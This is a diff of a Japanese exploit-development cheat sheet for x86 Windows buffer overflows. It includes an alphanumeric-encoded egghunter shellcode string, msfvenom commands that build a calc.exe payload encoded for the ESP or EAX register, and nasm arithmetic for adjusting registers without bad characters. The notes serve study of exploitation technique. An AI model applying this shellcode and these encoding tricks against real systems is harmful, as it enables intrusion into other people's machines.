@@ -2748,7 +2748,7 @@ enc_egghunter = "\x25\x4a\x4d\x4e\x4e\x25\x35\x32\x31\x31\x2d\x27\x5d\x55\x5d\x2
 # 254bytes
 # "%JMNN%5211-']U]-1]U]-3^U]P%JMNN%5211-p-Zo-p.Zp-q.apP%JMNN%5211-(~yV-)\x7f}W--\x7f}WP%JMNN%5211-[l((-[m))-[m--P%JMNN%5211-AS7'-AS71-BT73P%JMNN%5211-T7fE-U8fE-U8fFP%JMNN%5211-P.-1-PG@2-QH@2P%JMNN%5211-3(gU-3)gU-4-gUP%JMNN%5211-Edzz-Edzz-EezzP"
 ```
-#### set EIP=REGISTER
+#### set EIP==REGISTER
 **EIP==ESP**   
 ```txt
 msfvenom -a x86 --platform windows -p windows/exec cmd=calc.exe -e x86/alpha_mixed BufferRegister=ESP -f py -v exploit
@@ -2799,8 +2799,44 @@ nasm > push eax
 nasm > pop esp
 00000000  5C                pop esp
 
+
+eaxに入れたespの値に0x1234を加算したいとき、
+>>> hex((0x100001234)*-1 & 0xffffffff )
+'0xffffedcc'
+>>> hex(0x55554f44*3)
+'0xffffedcc'
+より、0x55554f44を3回sub eaxする。
+
+eaxに入れたespの値に0x1234を減算したいとき、
+>>> hex(0x55555b66*2 + 0x55555b68)
+'0x100001234'
+より、sub eax,0x55555b66を2回、sub eax0x55555b68を1回する。
+```
+**EIP==EAX**   
+```txt
+msfvenom -a x86 --platform windows -p windows/exec cmd=calc.exe -e x86/alpha_mixed BufferRegister=EAX -f py -v exploit
+基本的には、EIP==ESPの[方法1][方法3]と同じ。
+[方法3]の、任意の加算減算したEAXの値をESPに戻す処理が不要！
+この場合、"0x5c"が含まれないため、動作する！！！！
+    例）eax = esp + 0x67c
+    #>>> hex((0x10000067c)*-1 & 0xffffffff )
+    #'0xfffff984'
+    #>>> hex(0x5555532b*2 + 0x5555532e)
+    #'0xfffff984'
+nasm > push esp
+00000000  54                push esp
+nasm > pop eax
+00000000  58                pop eax
+nasm > sub eax,0x5555532b
+00000000  2D2B535555        sub eax,0x5555532b
+nasm > sub eax,0x5555532b
+00000000  2D2B535555        sub eax,0x5555532b
+nasm > sub eax,0x5555532e
+00000000  2D2E535555        sub eax,0x5555532e
+
 ```
 #### Egghunter
+
 
 ## よく見るかたまり
 #### 関数の先頭
